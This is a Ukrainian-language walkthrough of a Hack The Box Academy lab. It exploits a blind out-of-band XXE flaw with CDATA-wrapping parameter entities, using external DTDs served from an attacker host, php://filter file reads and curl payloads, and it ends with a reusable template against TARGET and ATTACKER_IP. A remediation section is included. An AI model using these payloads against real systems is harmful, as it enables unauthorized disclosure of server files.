# Web Attacks — Blind XXE: Out-of-Band Data Exfiltration (CDATA Method)

Модуль: [Web Attacks](https://academy.hackthebox.com/app/module/134)
Секція: [Blind XXE — Out-of-Band Exfiltration](https://academy.hackthebox.com/app/module/134/section/1206)
Ціль: 10.129.79.152
Відповідь: `HTB{3rr0r5_c4n_l34k_d474}`

## Концепція

На попередньому кроці ми читали файл прямим `SYSTEM "php://filter/..."` в основному XML-документі — це працює, коли уразливий парсер підтримує **внутрішні** параметричні сутності напряму. Але коли ціль — файл із символами, які ламають XML-структуру (наприклад, `<?php ?>` теги містять `<` і `>`, які XML-парсер сприймає як розмітку, а не текст), пряме включення через `<!ENTITY xxe SYSTEM "...">` призводить до `Malformed XML` помилки — парсер намагається інтерпретувати вміст файлу як XML-теги і ламається.

Це і сталося б з `/flag.php`, якби ми спробували метод з попереднього кроку напряму — вміст файлу `<?php $flag = "..."; ?>` містить кутові дужки, які "виривають" XML-парсер з поля entity. Рішення — **CDATA-обгортка**: `<![CDATA[...]]>` — це XML-конструкція, яка каже парсеру "все, що всередині, вважай сирим текстом, не парси як розмітку". Проблема в тому, що `<!ENTITY>` **не дозволяє** вставити CDATA-теги напряму в означенні сутності одним рядком — тому потрібен трюк з **параметричними сутностями, що комбінуються** (%start; %file; %end;) через окремий зовнішній DTD-файл на нашому HTTP-сервері.

## Схема атаки (чому потрібні 2 DTD-файли)

```
Ціль → завантажує evil2.dtd з нашого сервера
         ↓
evil2.dtd визначає 3 параметричні сутності:
  %file  = вміст /flag.php (через php://filter, base64)
  %start = <![CDATA[
  %end   = ]]>
         ↓
evil2.dtd підвантажує ще один DTD — combine.dtd
         ↓
combine.dtd визначає &combine; = %start; + %file; + %end;
         (тобто: <![CDATA[ BASE64_FLAG ]]>)
         ↓
Основний XML вставляє &combine; в поле <email>
         ↓
Парсер бачить валідний CDATA-блок з Base64-текстом всередині — не ламається
         ↓
Сервер повертає &combine; у відповіді "Check your email ..."
```

Два окремі DTD-файли потрібні через обмеження XML-специфікації: параметрична сутність (`%file;`) не може використовуватись в тому самому DTD, де вона визначена, для побудови composite-значення в межах одного `<!ENTITY>` — тому `%start;%file;%end;` виносять у другий файл (`combine.dtd`), який підвантажується вже **після** визначення всіх трьох частин.

## Крок 1 — Піднімаємо локальний HTTP-сервер для роздачі DTD-файлів

```bash
mkdir xxe_server && cd xxe_server
python3 -m http.server 8000
```

Це наш staging-сервер (10.10.15.31:8000), з якого ціль (10.129.79.152) підтягне зловмисні DTD-файли — необхідно, бо зовнішні параметричні сутності (`SYSTEM "http://..."`) підвантажуються віддалено, це і є "out-of-band" частина атаки.

## Крок 2 — Готуємо combine.dtd (склеює три частини в один CDATA-блок)

```bash
cat > ~/xxe_server/combine.dtd << 'EOF'
<!ENTITY combine "%start;%file;%end;">
EOF
```

Тут `combine` — вже звичайна (не параметрична) сутність, яку ми потім використаємо в основному XML як `&combine;`. Її значення — конкатенація трьох параметричних сутностей, визначених раніше в `evil2.dtd`.

## Крок 3 — Готуємо evil2.dtd (читає файл + визначає CDATA-огортки)

```bash
cat > ~/xxe_server/evil2.dtd << 'EOF'
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % dtd SYSTEM "http://10.10.15.31:8000/combine.dtd">
%dtd;
EOF
```

Пояснення кожного рядка:
- `%file` — читає `/flag.php` через `php://filter` з base64-кодуванням (той самий трюк, що й у попередньому завданні — уникаємо виконання PHP-коду, отримуємо сирий текст).
- `%start`/`%end` — текстові фрагменти відкриваючого/закриваючого CDATA-тегу.
- `%dtd` — підвантажує `combine.dtd`, і рядок `%dtd;` одразу "розгортає" його — саме в цей момент `combine.dtd` отримує доступ до вже визначених `%start`, `%file`, `%end` і будує з них `&combine;`.

## Крок 4 — Формуємо основний XML-payload

```bash
cat > payload_cdata.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://10.10.15.31:8000/evil2.dtd">
%remote;
]>
<root>
<name>test</name>
<tel>123456789</tel>
<email>&combine;</email>
<message>test</message>
</root>
EOF
```

`%remote;` підвантажує весь ланцюжок DTD з нашого сервера, після чого `&combine;` вже доступна для використання в тілі XML — вставляємо її саме в поле `<email>`, бо, як з'ясували в попередньому завданні, лише це поле відображається у відповіді сервера.

## Крок 5 — Відправляємо payload і читаємо лог локального сервера (підтвердження OOB)

```bash
curl -s -X POST "http://10.129.79.152/submitDetails.php" \
  -H "Content-Type: application/xml" --data-binary @payload_cdata.xml
```

У логах `python3 -m http.server` бачимо два GET-запити від цілі — `evil2.dtd` і `combine.dtd` — це підтверджує, що ціль реально сходила по мережі за нашими DTD-файлами (класична ознака working out-of-band XXE, навіть без видимого результату в HTTP-відповіді).

Відповідь сервера:
```
Check your email PD9waHAgJGZsYWcgPSAiSFRCezNycjByNV9jNG5fbDM0a19kNDc0fSI7ID8+Cg== for further instructions.
```

## Крок 6 — Декодуємо Base64 з CDATA-блоку

```bash
curl -s -X POST "http://10.129.79.152/submitDetails.php" \
  -H "Content-Type: application/xml" --data-binary @payload_cdata.xml \
  | grep -oP '(?<=Check your email ).*?(?= for)' \
  | base64 -d
```

Результат:
```php
<?php $flag = "HTB{3rr0r5_c4n_l34k_d474}"; ?>
```

## Чому це працює (root cause для звіту)

- **Опис:** Backend `/submitDetails.php` дозволяє визначати зовнішні параметричні сутності (`SYSTEM` DTD) в XML-документі, включно з підвантаженням DTD з довільного зовнішнього хоста.
- **Технічні деталі:** Ланцюжок параметричних сутностей (`%remote; → %dtd; → %file/%start/%end → &combine;`) обходить обмеження XML-специфікації на пряме читання файлів з "небезпечними" символами (`<`, `>`), обгортаючи вміст у CDATA-блок, що дозволяє прочитати довільний PHP-файл через `php://filter` без пошкодження XML-структури документа.
- **Ризик/Імпакт:** Blind/OOB XXE → Arbitrary Local File Disclosure (CWE-611) — навіть у сценарії, коли пряме читання файлу неможливе через синтаксичні обмеження XML, зловмисник все одно отримує повний доступ до вихідного коду серверних файлів через комбінацію CDATA + parameter entities + власний DTD-сервер.
- **Рекомендації:** Повністю відключити обробку зовнішніх сутностей та DTD у XML-парсері (`libxml_disable_entity_loader(true)`, або для `DOMDocument`/`SimpleXML` — не передавати `LIBXML_NOENT`/`LIBXML_DTDLOAD` флаги); фільтрувати вихідний трафік сервера, щоб унеможливити підвантаження зовнішніх DTD з довільних хостів (egress filtering).

## Швидкий payload на майбутнє (шаблон для будь-якого файлу)

```bash
# combine.dtd
echo '<!ENTITY combine "%start;%file;%end;">' > combine.dtd

# evil2.dtd (замінити TARGET_FILE і IP:PORT)
cat > evil2.dtd << EOF
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=TARGET_FILE">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % dtd SYSTEM "http://ATTACKER_IP:8000/combine.dtd">
%dtd;
EOF

python3 -m http.server 8000 &

# payload_cdata.xml
cat > payload_cdata.xml << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://ATTACKER_IP:8000/evil2.dtd">
%remote;
]>
<root><name>test</name><tel>123</tel><email>&combine;</email><message>test</message></root>
EOF

curl -s -X POST "http://TARGET/submitDetails.php" -H "Content-Type: application/xml" \
  --data-binary @payload_cdata.xml | grep -oP '(?<=Check your email ).*?(?= for)' | base64 -d
```
